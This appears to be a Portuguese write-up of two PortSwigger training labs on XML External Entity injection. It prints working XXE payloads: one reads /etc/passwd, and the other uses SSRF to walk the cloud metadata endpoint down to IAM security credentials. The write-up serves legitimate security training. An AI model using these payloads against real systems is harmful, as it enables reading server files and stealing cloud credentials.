---
title: "PortSwigger - XXE"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de XXE (XML External Entity) da PortSwigger"
keywords: ["PortSwigger", "XXE", "XML External Entity", "SSRF", "Web Security"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: Exploiting XXE using external entities to retrieve files
1. Vá para o endpoint `POST /product/stock`, encontrado por meio da funcionalidade de `stockCheck`. 
2. Nos dados da requisição, altere-os com o seguinte payload de XXE, por meio do Burp: 

```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>
```

## Lab: Exploiting XXE to perform SSRF attacks
1. Vá para o endpoint `POST /product/stock`, encontrado por meio da funcionalidade de `stockCheck`. 
2. Inicialmente a URL utilizada foi: `http://169.254.169.254`, que gerá um erro de código 400, com uma mensagem do tipo: `"Invalid product ID: latest"`. Após isso a URL utilizada foi  `http://169.254.169.254/latest`, que retornou o erro com a mensagem: `Invalid product ID:meta-data`. Assim sucessivamente até chegar na URL do payload: 

```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
  <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
